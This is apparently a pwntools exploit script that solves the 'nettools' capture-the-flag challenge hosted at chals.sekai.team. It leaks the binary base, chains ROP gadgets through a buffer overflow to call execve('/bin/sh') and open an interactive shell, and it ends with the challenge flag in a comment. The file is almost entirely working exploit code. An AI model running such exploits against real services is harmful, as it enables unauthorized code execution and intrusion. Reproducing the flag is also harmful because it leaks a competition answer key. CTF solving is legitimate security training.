#!/usr/bin/env python3

from pwn import *

elf = ELF("./nettools")
# libc = ELF("./libc-2.31.so", checksec=False)
g = ROP(elf)

s  = remote("chals.sekai.team", 4001)
# s = process(elf.path)

def main():

	# Base leak
	s.recvuntil(b'Opss! Something is leaked: ')
	addr = eval(s.recvline(False))
	base = addr - elf.sym["_ZN8nettools6CHOICE17h0d0daa1684b4400fE"]
	s.success(f"Base leak is: {hex(base)}")

	# Gadgets
	POP_RSI = base + g.find_gadget(['pop rsi', 'ret'])[0]
	POP_RAX = base + g.find_gadget(['pop rax', 'ret'])[0]
	POP_RCX = base + g.find_gadget(['pop rcx', 'ret'])[0]
	SYSCALL = base + g.find_gadget(['syscall'])[0]
	MOV_RDI_RAX_JMP_RCX = base + 0x000000000005b57b
	POP_RDX_PTR_RAX = base + 0x0000000000020bb3
	ADD_RDI_POP_RCX = base + 0x000000000004ccfe

	# ROP via BoF
	rop = flat(
		cyclic(400) + b'\x00',					# size(input) = 0
		cyclic(151),							# trash
		b'/bin/sh\x00',							# '/bin/sh' among trash
		cyclic(184),							# padding

		p64(base + 0x000000000004f3e9)*3,		# prevention

		p64(POP_RDX_PTR_RAX),					# rdx=0
		p64(0x0),
		p64(POP_RCX),
		p64(POP_RSI),
		p64(MOV_RDI_RAX_JMP_RCX),				# rdi=&stack, rsi=0
		p64(0x0),
		p64(ADD_RDI_POP_RCX),					# rdi=&'/bin/sh'
		p64(0x0),
		p64(POP_RAX),							# rax=59
		p64(59),
		p64(SYSCALL)							# exec('/bin/sh')
	)

	s.sendline(b'3')
	s.sendline(rop)

	s.interactive()


# SEKAI{g0_g0_g0_th4t's_h0w_th3_c4rg0_bl0w_4c6cfa1707c99bd5105dd8f16590bece}

if __name__=="__main__":
	main()